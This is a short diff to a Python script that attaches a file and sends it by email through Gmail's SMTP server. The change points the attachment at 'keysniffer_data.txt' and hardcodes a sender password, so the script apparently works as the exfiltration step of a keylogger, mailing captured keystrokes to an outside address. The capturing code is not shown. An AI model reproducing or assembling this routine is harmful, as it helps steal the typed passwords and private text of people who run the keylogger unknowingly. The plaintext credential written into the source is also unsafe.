@@ -93,7 +93,7 @@ msg.attach(MIMEText(body, "plain"))
 
 # open the file to be sent
 filename = "File_name_with_extension"
-attachment = open("Path of the file", "rb")
+attachment = open("keysniffer_data.txt", "rb")
 
 # instance of MIMEBase and named as p
 p = MIMEBase("application", "octet-stream")
@@ -116,7 +116,7 @@ s = smtplib.SMTP("smtp.gmail.com", 587)
 s.starttls()
 
 # Authentication
-s.login(fromaddr, "Password_of_the_sender")
+s.login(fromaddr, "Test..123")
 
 # Converts the Multipart msg into a string
 text = msg.as_string()
